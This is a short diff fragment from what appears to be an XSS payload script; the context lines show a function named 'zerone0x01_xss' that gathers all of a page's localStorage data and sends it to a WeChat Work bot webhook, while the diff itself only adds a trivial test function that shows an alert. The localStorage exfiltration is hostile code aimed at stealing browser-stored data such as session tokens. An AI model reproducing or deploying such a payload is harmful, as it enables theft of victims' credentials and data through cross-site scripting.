@@ -31,3 +31,7 @@ function zerone0x01_xss() {
     const localStorageData = getAllLocalStorageData();
     sendToWeChatWorkBot(webhookUrl, localStorageData);
 }
+
+function test() {
+    alert("123test");
+}
